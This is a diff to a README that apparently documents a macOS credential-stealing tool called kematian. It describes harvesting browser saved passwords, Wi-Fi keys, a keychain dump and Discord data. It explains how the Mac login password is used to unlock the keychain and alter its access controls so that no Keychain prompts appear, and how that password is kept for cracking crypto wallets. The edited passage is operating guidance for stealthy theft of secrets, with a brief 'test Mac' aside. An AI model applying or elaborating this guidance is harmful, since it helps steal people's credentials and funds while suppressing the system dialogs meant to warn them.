@@ -65,7 +65,9 @@ Chrome/Brave/Edge saved passwords need the **login Keychain** unlocked. Without 
 KEMATIAN_MAC_PASSWORD='YourMacLoginPassword' ./kematian-darwin-arm64
 ```
 
-This runs `security unlock-keychain` before harvest — **no password modal**. The Mac login password is also added to `password_candidates.json` for wallet cracking.
+This runs `security unlock-keychain` before harvest, passes `-p` on every `security(1)` call (Chrome Safe Storage, Wi‑Fi, keychain dump, Discord), and updates keychain ACLs so **no extra Keychain Access dialogs** should appear during harvest. Use the **real Mac login password** (the account password, not the webhook). The Mac login password is also added to `password_candidates.json` for wallet cracking.
+
+**Note:** `-mac-password` silences **Keychain** prompts. macOS **Privacy (TCC)** dialogs — e.g. Full Disk Access for protected folders — cannot be granted with a password; grant **Full Disk Access** to Terminal on a test Mac if needed.
 
 ### Discord upload size
 
